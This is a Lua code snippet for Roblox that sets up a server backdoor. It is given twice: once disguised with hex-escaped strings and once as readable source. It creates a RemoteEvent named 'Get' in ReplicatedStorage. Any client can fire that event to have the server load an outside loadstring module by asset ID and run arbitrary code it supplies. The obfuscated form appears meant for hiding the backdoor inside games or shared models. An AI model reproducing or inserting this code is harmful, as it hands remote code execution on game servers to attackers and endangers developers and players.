-- original source [NOT OBFUSCATED]:
e=getfenv();inst=e['\x49\x6E\x73\x74\x61\x6E\x63\x65']['\x6E\x65\x77']('\x52\x65\x6D\x6F\x74\x65\x45\x76\x65\x6E\x74');e['\x69\x6E\x73\x74']['\x4E\x61\x6D\x65']="\x47\x65\x74";e['\x69\x6E\x73\x74']['\x50\x61\x72\x65\x6E\x74']=e['\x67\x61\x6D\x65']['\x52\x65\x70\x6C\x69\x63\x61\x74\x65\x64\x53\x74\x6F\x72\x61\x67\x65'];e['\x67\x61\x6D\x65']['\x52\x65\x70\x6C\x69\x63\x61\x74\x65\x64\x53\x74\x6F\x72\x61\x67\x65']['\x47\x65\x74']['\x4F\x6E\x53\x65\x72\x76\x65\x72\x45\x76\x65\x6E\x74']:Connect(function(plr, arg)e['\x73\x72\x63']=arg;e['\x72\x65\x71\x75\x69\x72\x65'](e['\x74\x6F\x6E\x75\x6D\x62\x65\x72']('\x31\x31\x31\x33\x32\x36\x30\x31\x33\x31\x34'))(e['\x67\x65\x74\x66\x65\x6E\x76']()['\x73\x72\x63'],e['\x67\x65\x74\x66\x65\x6E\x76']())()end);


-- readable source:
inst = Instance.new('RemoteEvent')
inst.Name = "Get"
inst.Parent = game.ReplicatedStorage
game.ReplicatedStorage.Get.OnServerEvent:Connect(function(plr, arg)
  require(11132601314)(arg, getfenv())() -- adonis loadstring, you can use your own loadstring if you want
end)
